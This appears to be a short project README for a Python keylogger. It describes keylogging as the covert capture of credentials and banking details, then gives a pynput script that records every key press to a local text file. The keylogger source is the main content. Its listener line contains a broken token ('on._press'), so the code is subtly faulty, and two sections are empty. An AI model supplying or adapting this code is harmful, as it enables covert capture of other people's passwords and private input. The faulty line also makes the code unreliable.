# Keylogger-Python

## Background and Significance 
Keylogging is the method of storing key-strokes on a device, particularly without the user knowing. Having a program such as this running on your device will result in the unaware surrendering of confidential data to malicious hackers, including login credentials and banking details.

## Objective
This mini-project aims to create a successful key-logging script, that when executed, will capture keystrokes made by the user in any environment on the device.

## Skills Learned

## Tools/Languages Used
- VSCode
- Python

## Steps & Code
<code>
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on._press=keyPressed) 
    listener.start()
    input()
</code>
## Tips
